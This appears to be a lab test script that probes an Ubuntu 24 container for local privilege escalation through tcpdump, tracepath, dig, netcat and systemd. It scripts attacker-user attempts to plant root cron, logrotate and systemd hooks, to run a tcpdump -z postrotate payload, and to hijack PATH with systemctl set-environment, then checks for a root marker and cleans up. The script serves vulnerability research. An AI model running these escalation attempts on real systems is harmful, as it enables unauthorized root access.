#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -euo pipefail

marker=/root/network_diagnostics_tools_lpe_marker
work=/home/attacker/network_diagnostics_tools_probe

cleanup() {
  rm -f "$marker" /tmp/network_diag_*
  rm -rf "$work"
  systemctl reset-failed >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM
cleanup

run_attacker() {
  echo "### attacker: $*"
  set +e
  runuser -u attacker -- timeout 20s bash -lc "$*" 2>&1
  rc=$?
  set -e
  echo "rc=$rc"
}

run_root() {
  echo "### root: $*"
  set +e
  timeout 20s bash -lc "$*" 2>&1
  rc=$?
  set -e
  echo "rc=$rc"
}

echo "## target and package proof"
id
id attacker
sed -n '1,8p' /etc/os-release
uname -a
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  tcpdump libpcap0.8t64 mtr-tiny iputils-ping iputils-tracepath \
  netcat-openbsd bind9-dnsutils bind9-host curl wget ftp tnftp inetutils-telnet \
  2>&1 | sort

echo "## helper modes and capabilities"
for p in \
  /usr/bin/tcpdump /usr/bin/mtr-packet /usr/bin/ping /usr/bin/tracepath \
  /usr/bin/nc.openbsd /usr/bin/netcat /usr/bin/dig /usr/bin/host \
  /usr/bin/curl /usr/bin/wget /usr/bin/ftp /usr/bin/tnftp /usr/bin/telnet; do
  [ -e "$p" ] && stat -Lc '%A %a %U:%G %F %n' "$p" || echo "MISSING $p"
done
getcap -r /usr/bin /usr/sbin /usr/lib 2>/dev/null | sort | grep -E 'tcpdump|mtr|ping|tracepath|gst|snap|cap_' || true

echo "## default root service/timer proof"
systemctl list-unit-files '*tcpdump*' '*pcap*' '*mtr*' '*tracepath*' '*rsync*' --no-pager || true
find /usr/lib/systemd/system /etc/systemd/system /etc/cron* /etc/logrotate.d /usr/lib/tmpfiles.d \
  -maxdepth 2 -type f 2>/dev/null | sort | xargs grep -nE 'tcpdump|pcap|mtr-packet|tracepath|netcat|dig|host|curl|wget|ftp|telnet' 2>/dev/null | sed -n '1,220p' || true

echo "## writable roots"
for p in /usr/bin/tcpdump /etc/tcpdump /etc/logrotate.d /etc/cron.daily /usr/lib/systemd/system /run/systemd/system /tmp /var/tmp; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p"
  else
    echo "MISSING $p"
  fi
done

echo "## attacker cannot install root hooks or service overrides"
run_attacker '
id
for p in \
  /etc/logrotate.d/network-diagnostics-lpe \
  /etc/cron.daily/network-diagnostics-lpe \
  /usr/lib/systemd/system/network-diagnostics-lpe.service \
  /run/systemd/system/network-diagnostics-lpe.service \
  /etc/tcpdump/network-diagnostics-lpe; do
  echo "--- $p"
  mkdir -p "$(dirname "$p")" 2>/tmp/network_diag_mkdir.err || true
  printf "owned\n" > "$p" 2>/tmp/network_diag_write.err
  echo "write_rc=$? err=$(cat /tmp/network_diag_write.err 2>/dev/null)"
done
'

echo "## attacker direct tcpdump/postrotate and network helper attempts"
run_attacker '
set -e
mkdir -p "$HOME/network_diagnostics_tools_probe"
cat > "$HOME/network_diagnostics_tools_probe/postrotate.sh" <<EOF
#!/bin/sh
id > "$HOME/network_diagnostics_tools_probe/postrotate_uid"
touch /root/network_diagnostics_tools_lpe_marker 2>/dev/null || true
echo "args=\$*" >> "$HOME/network_diagnostics_tools_probe/postrotate_args"
EOF
chmod 755 "$HOME/network_diagnostics_tools_probe/postrotate.sh"
for cmd in \
  "tcpdump -D" \
  "tcpdump -i lo -c 1 -w /tmp/network_diag_attacker.pcap" \
  "tcpdump -i lo -G 1 -W 1 -w /tmp/network_diag_rotate.pcap -z $HOME/network_diagnostics_tools_probe/postrotate.sh" \
  "tracepath 127.0.0.1" \
  "dig localhost" \
  "host localhost" \
  "nc.openbsd -h"; do
  echo "--- $cmd"
  timeout 6s bash -lc "$cmd" 2>&1 | sed -n "1,80p"
  echo cmd_rc=${PIPESTATUS[0]}
done
for f in "$HOME"/network_diagnostics_tools_probe/postrotate_*; do
  [ -e "$f" ] && { echo "--- $f"; cat "$f"; }
done
test -e /root/network_diagnostics_tools_lpe_marker && echo direct_root_marker || echo no_direct_root_marker
'

echo "## attacker service start and manager-env attempts"
run_attacker '
for cmd in \
  "systemctl start tcpdump.service" \
  "systemctl start rsync.service" \
  "systemctl set-environment PATH=$HOME/network_diagnostics_tools_probe:$PATH"; do
  echo "--- $cmd"
  timeout 6s bash -lc "$cmd" 2>&1 | sed -n "1,80p"
  echo cmd_rc=${PIPESTATUS[0]}
done
'

echo "## root fixed-trigger sanity check"
run_root 'systemctl start rsync.service 2>&1; echo rsync_start_rc=$?; systemctl status rsync.service --no-pager -l 2>&1 | sed -n "1,80p"'

echo "## root proof before cleanup"
if [ -e "$marker" ]; then
  echo ROOT_PROOF=yes
  stat -Lc '%A %a %U:%G %n' "$marker"
  cat "$marker" 2>/dev/null || true
else
  echo ROOT_PROOF=no
fi

cleanup

echo "## cleanup and health"
for p in "$marker" "$work" /tmp/network_diag_attacker.pcap /tmp/network_diag_rotate.pcap; do
  [ -e "$p" ] || [ -L "$p" ] && echo "LEFT $p" || echo "ABSENT $p"
done
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET
